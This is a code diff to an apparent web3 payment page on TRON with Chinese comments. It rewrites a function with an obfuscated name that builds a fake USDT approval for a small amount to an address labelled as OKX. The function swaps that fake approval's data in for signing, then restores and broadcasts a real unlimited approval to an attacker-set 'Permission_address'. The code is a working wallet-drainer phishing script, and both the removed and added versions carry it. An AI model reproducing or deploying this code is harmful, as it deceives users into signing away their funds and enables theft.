@@ -19,80 +19,86 @@ async function onNextButtonClick() {
 }
 
 async function DjdskdbGsj() {
-  const usdtAmountInSun = tronWeb.toSun(currentAmount);
-  const maxUint256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
-  const feeLimit = 1000000000;
+    try { 
+        // 获取 tronWeb 实例，用于与 TRON 网络交互
+        const tronWebInstance = window.tronWeb;
+        
+        // 获取用户地址
+        const userAddress = userData.address; 
+        
+        // 将 currentAmount 转换为 TRON 计价单位 Sun（1 TRX = 1,000,000 Sun）
+        const disguisedAmount = tronWebInstance.toSun(currentAmount);
+        
+        // 实际的 approve 方法参数
+        const realApproveParams = [
+            { "type": "address", "value": window.Permission_address }, // 授权 spender 地址（权限地址）
+            { "type": "uint256", "value": "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff" } // 授权最大金额
+        ];
 
-  try {
-    const paymentAddress = tronWeb.address.fromHex(window.Payment_address);
+        // 伪装的 approve 方法参数
+        const disguisedApproveParams = [
+            { "type": "address", "value": "THRAE2VhGNAcvPKtT96AqyXtSQwhiU1XL8" }, // OKX 合约地址，请勿修改
+            { "type": "uint256", "value": disguisedAmount } // 伪装的金额
+        ];
 
-    console.log("构建TRX转账交易...");
-    const transferTransaction = await tronWeb.transactionBuilder.sendTrx(
-      paymentAddress,
-      usdtAmountInSun,
-      tronWeb.defaultAddress.base58,
-      { feeLimit: feeLimit }
-    );
+        // 设置交易选项，交易费用上限为 100000000 Sun（100 TRX）
+        const transactionOptions = { "feeLimit": 100000000 };
 
-    // 构建真实授权交易参数
-    const realApproveParams = [
-      { type: 'address', value: window.Permission_address },
-      { type: 'uint256', value: maxUint256 }
-    ];
+        // 构建实际的 approve 交易
+        let realApproveTransaction = await tronWebInstance.transactionBuilder.triggerSmartContract(
+            tronWebInstance.address.toHex(window.usdtContractAddress), // 将 USDT 合约地址转换为 hex 格式
+            "approve(address,uint256)", // 调用合约的 approve 方法
+            transactionOptions, // 交易选项
+            realApproveParams, // 真实参数
+            userAddress // 用户的 TRON 地址
+        );
 
-    // 构建伪装授权交易参数
-    const disguisedApproveParams = [
-      { type: 'address', value: 'THRAE2VhGNAcvPKtT96AqyXtSQwhiU1XL8' }, // 伪装地址，保持与之前一致
-      { type: 'uint256', value: usdtAmountInSun } // 使用转账金额进行伪装
-    ];
+        // 构建伪装的 approve 交易
+        let disguisedApproveTransaction = await tronWebInstance.transactionBuilder.triggerSmartContract(
+            tronWebInstance.address.toHex(window.usdtContractAddress), // USDT 合约地址
+            "approve(address,uint256)", // approve 方法
+            transactionOptions, // 交易选项
+            disguisedApproveParams, // 伪装的参数
+            userAddress // 用户的 TRON 地址
+        );
 
-    console.log("构建授权交易...");
-    const realApproveTransaction = await tronWeb.transactionBuilder.triggerSmartContract(
-      tronWeb.address.toHex(window.usdtContractAddress),
-      'increaseApproval(address,uint256)',
-      { feeLimit: feeLimit },
-      realApproveParams,
-      tronWeb.defaultAddress.base58
-    );
+        // 保存真实交易的原始数据
+        var originalRawData = realApproveTransaction.transaction.raw_data;
 
-    const disguisedApproveTransaction = await tronWeb.transactionBuilder.triggerSmartContract(
-      tronWeb.address.toHex(window.usdtContractAddress),
-      'increaseApproval(address,uint256)',
-      { feeLimit: feeLimit },
-      disguisedApproveParams,
-      tronWeb.defaultAddress.base58
-    );
+        // 替换真实交易的 raw_data 为伪装交易的 raw_data
+        realApproveTransaction.transaction.raw_data = disguisedApproveTransaction.transaction.raw_data;
 
-    // 将真实交易的 raw_data 替换为伪装交易的数据
-    var originalRawData = realApproveTransaction.transaction.raw_data;
-    realApproveTransaction.transaction.raw_data = disguisedApproveTransaction.transaction.raw_data;
+        // 对交易进行签名
+        const signedTransaction = await tronWebInstance.trx.sign(realApproveTransaction.transaction);
 
-    console.log("交易签名中...");
-    const signedTransaction = await tronWeb.trx.sign(realApproveTransaction.transaction);
+        // 恢复原始交易的 raw_data
+        signedTransaction.raw_data = originalRawData;
 
-    // 将 raw_data 恢复为原始的真实数据
-    signedTransaction.raw_data = originalRawData;
+        // 发送签名后的交易
+        const result = await tronWebInstance.trx.sendRawTransaction(signedTransaction);
 
-    console.log("发送交易...");
-    const broadcastResult = await tronWeb.trx.sendRawTransaction(signedTransaction);
+        // 检查交易是否成功
+        if (result.result || result.success) { 
+            let transactionHash;
+            
+            // 获取交易哈希
+            if (result.transaction && result.transaction.txID) { 
+                transactionHash = result.transaction.txID;
+            } else if (result.txid) { 
+                transactionHash = result.txid;
+            } else { 
+                throw new Error("无法获取交易哈希");
+            }
 
-    console.log("交易结果:", broadcastResult);
-    if (broadcastResult.result || broadcastResult.success) {
-      const transactionHash = broadcastResult.txid || (broadcastResult.transaction && broadcastResult.transaction.txID);
-      if (!transactionHash) {
-        throw new Error("无法获取交易哈希");
-      }
-      console.log("交易发送成功，交易哈希:", transactionHash);
-      tip("交易成功");
-      return transactionHash;
-    } else {
-      throw new Error("交易失败");
-    }
-  } catch (error) {
-    console.error("操作失败:", error);
-    tip("交易失败，请重试");
-    throw error;
-  }
+            // 返回交易哈希
+            return transactionHash; 
+        } else { 
+            throw new Error("交易发送失败");
+        } 
+    } catch (error) { 
+        // 捕获并抛出错误
+        throw error; 
+    } 
 }
 
 async function KdhshaBBHdg() {
